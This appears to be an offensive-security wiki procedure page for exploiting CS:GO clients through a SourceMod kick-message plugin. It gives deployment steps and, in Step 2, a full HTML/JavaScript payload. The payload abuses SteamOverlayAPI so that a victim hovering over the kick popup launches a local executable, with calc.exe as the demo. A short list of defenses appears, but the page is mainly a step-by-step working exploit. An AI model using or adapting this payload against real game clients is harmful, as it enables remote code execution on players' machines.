---
id: proc-csgo-testkick-deploy-001
tags:
  - rce
  - plugin
  - xss
type: procedure
tools:
  - '[[tools/SourceMod]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/sm-testkick-with-rce-payload]]'
  - '[[commands/kickclient-function]]'
verified: false
platforms:
  - Windows
  - Game
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:24:14.846Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
---
# Deploy Testkick Plugin and Execute Payload

## Summary

This procedure deploys a SourceMod plugin for manual kick payload delivery and executes it to trigger XSS-based RCE on the victim client.

## Description

The testkick.smx plugin registers a command that calls KickClient with the full argument string as the message, allowing complex payloads. Connecting to the server and running the command in console displays the popup, where hovering executes JS via SteamOverlayAPI to launch local executables like calc.exe.

## Requirements

1. Compiled testkick.smx
2. Server with SourceMod
3. Victim CS:GO client connected

## Defense

Defensive measures and detection strategies:

- Disable custom plugins
- Monitor console commands
- Block Steam API calls from UI

## Objectives

1. Deliver payload via plugin
2. Trigger RCE on interaction
3. Validate exploitation

## Instructions

### Step 1: Deploy Plugin

**Context**: Place compiled plugin on server.

Copy testkick.smx to addons\sourcemod\plugins\, restart server.

> Expected output: sm_testkick command available.

### Step 2: Execute Payload Command

**Context**: Connect as victim and run command for kick.

**Command** ([[commands/sm-testkick-with-rce-payload]]):

```bash
# In client console
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

> Explanation: Kicks self with payload. Hover mouse (defaults to center) over text. Expected output: calc.exe launches.

### Step 3: Verify with KickClient

**Context**: In plugin code, ensure multiple calls for reliability.

Use [[commands/kickclient-function]] in handler.

> Expected output: Popup appears with clickable HTML.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploitation for Client Execution]]

### Sub-Techniques


## Commands Used

- [[commands/sm-testkick-with-rce-payload]]
- [[commands/kickclient-function]]

## Tools Used

- [[tools/SourceMod]]

## Tags

- rce
- plugin
- xss
